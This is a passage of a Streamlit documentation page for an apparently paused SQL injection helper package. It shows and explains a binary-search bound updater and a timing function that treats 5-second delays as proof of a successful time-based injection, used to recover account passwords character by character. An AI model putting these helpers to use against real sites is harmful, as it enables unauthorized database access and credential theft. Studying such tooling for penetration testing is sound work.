    
    st.write("""They are two sort of `binary_search_function`. The first use boolean input and can be use for every type of blind SQLi, or SQLi.
    The second function uses HTTP code as input. Despite the difference, the main process is similar. Let's see the function quickly.""")
    
    code = """def binary_search_boolean(result_bool: bool, operator1: str, hight: int, low: int, binary_average: int) -> int:
    if result_bool == True and operator1 =='<':
        hight = binary_average - 1
    if result_bool == True and operator1 =='>':
        low = binary_average + 1
    if result_bool == False and operator1 == '>':
        hight = binary_average - 1
    if result_bool == False and operator1 == '<':
        low = binary_average + 1
    return hight,low,binary_average"""
    
    st.code(code, language='python')
    st.markdown("<h3 style='text-align: center;'>Overview of the function</h3>", unsafe_allow_html=True)
    
    st.write("""The `binary_search_boolean` function is used to refine the boundaries of a binary search based on a boolean result from an SQL injection test. 
    This helps determine the correct numerical value by narrowing down the possible range. 
    Here, the binary_average is not updated, of course it's belong to you to update the binary_average when you need it.
    It will be the same thing for the second binary search function.
    """)
    
    st.markdown("<h3 style='text-align: center;'>Parameters</h3>", unsafe_allow_html=True)
    
    st.write("""
    - ***result_bool*** (bool): The result of the last boolean-based SQL injection condition (e.g., True if the condition was met, False otherwise).
    - ***operator1*** (str): The comparison operator used in the SQL condition ('<' or '>').
    - ***hight*** (int): The upper bound of the search range.
    - ***low*** (int): The lower bound of the search range.
    - ***binary_average*** (int): The midpoint of the current search range.
    """)
    
    st.markdown("<h3 style='text-align: center;'>Function Logic</h3>", unsafe_allow_html=True)
    
    st.write("""
        - If ***result_bool** is True and ***operator1*** == '<', the upper bound (***hight***) is moved below ***binary_average*** - 1.
        - If ***result_bool*** is True and ***operator1*** == '>', the lower bound (***low***) is moved above ***binary_average*** + 1.
        - If ***result_bool*** is False and ***operator1*** == '>', the upper bound (***hight***) is moved below ***binary_average*** - 1.
        - If ***result_bool*** is False and ***operator1*** == '<', the lower bound (***low***) is moved above ***binary_average*** + 1.
    """)
    
    st.markdown("<h3 style='text-align: center;'>Return Value</h3>", unsafe_allow_html=True)
    
    st.write("""The function returns the updated int values of hight, low, and binary_average.
    they will be use later in the code (*see the EXEMPLE file*). These value are very important for the research of data.
    For exemple in SQLi time based, we will use theses values to know which letter/number composes the password of a account.              
    """)
    
##########################################################################
# Concernant les fonctions principales du package

    st.subheader("Sendings payloads functions : 📡")
    
    st.write("""In this section, we are going to examine a function used for testing time-based SQL injection vulnerabilities. 
    The function `sending_payload_for_time_based_SQLi_getv` sends two HTTP requests with different payloads and measures the response time to determine whether a parameter is vulnerable based on the delay in the server's response.
    This method is typically used in time-based SQL injections where the response time varies based on the injected condition.""")

    code= """def sending_payload_for_time_based_SQLi_getv(payload_parameter1 : str, payload_parameter2: str,url: str, indice: int, cookies1: None, cookies2: None) -> bool:
    
    start_time = time.time()
    r = requests.get(url, cookies=cookies1)
    end_time = time.time()
    result_bool = (end_time - start_time) 
    if result_bool >= 5:
        result_bool = True
        print(f"This parameter work: {payload_parameter1}")
    else:
        result_bool = False
        print("")    
            
    start_time = time.time()
    r = requests.get(url, cookies=cookies2)
    end_time = time.time()
    result_control = (end_time - start_time)
    if result_control >=5:
        result_control = True
        print(f"Value found with this parameter: {payload_parameter2}")
    else:
        result_control= False
        print("")    
        
    return result_bool, result_control"""
    
    st.code(code, language='python')
    
    st.markdown("<h3 style='text-align: center;'>Overview of the Function</h3>", unsafe_allow_html=True)

    st.write("""The `sending_payload_for_time_based_SQLi_getv` function is designed for use in time-based SQL injection testing. It works by sending two HTTP GET requests to a target URL, each with different payloads, and then measures the response time to determine if there is a noticeable delay indicative of a successful injection. 
    A delay greater than a certain threshold (in this case, 5 seconds) is interpreted as a sign that the payload has triggered an action on the server, signaling a potential vulnerability.""")
        
    st.markdown("<h3 style='text-align: center;'>Parameters</h3>", unsafe_allow_html=True)

    st.write("""
        - ***payload_parameter1*** (str): The first parameter for the payload test.
        - ***payload_parameter2*** (str): The second parameter used to bypass false-positive.
        - ***url*** (str): The target URL for the SQL injection test.
        - ***indice*** (int): An index used for the particularity of the SQL injection ([see exemple file](https://github.com/Fournoy/PuzzlesSQL/blob/main/EXEMPLE_time_based_SQLI_main.py)).
        - ***cookies1*** (None): The first set of cookies to be included in the first HTTP request.
        - ***cookies2*** (None): The second set of cookies to be included in the second HTTP request.
    """)

    st.markdown("<h3 style='text-align: center;'>Function Logic</h3>", unsafe_allow_html=True)

    st.write("""
        - The function sends an HTTP GET request to the target URL with the first set of cookies and measures the response time.
        - If the response time is greater than or equal to 5 seconds, it considers this as a successful test for the first parameter and marks it as `True`.
        - The function then repeats the process with the second set of cookies and checks the response time again.
        - If the response time for the second parameter is greater than or equal to 5 seconds, it marks this as a success for the second parameter as well.
        - Both tests are performed because if the value = a and the first query is &gt;a or &lt;a, the response will of course be FALSE. 
        So, to avoid a false negative, we send another query with =a in the payload.
    """)

    st.markdown("<h3 style='text-align: center;'>Return Value</h3>", unsafe_allow_html=True)

    st.write("""The function returns two boolean values:
        - ***result_bool***: `True` if the first payload results in a response delay of 5 seconds or more, otherwise `False`.
        - ***result_control***: `True` if the second payload results in a response delay of 5 seconds or more, otherwise `False`.
        
    These values are used to determine whether the parameters are vulnerable to time-based SQL injections. 
    The response time threshold is adjustable, but it is commonly set to 5 seconds in this example. """)

    st.warning("The project is on PAUSE...")
    
    ROOT_DIR = Path(__file__).resolve().parents[1]  
    gif_sleep = ROOT_DIR / "image" / "project_PuzzleSQL_in_pause.gif"
    
    st.image(str(gif_sleep))

    
    

    
    
        
    
    







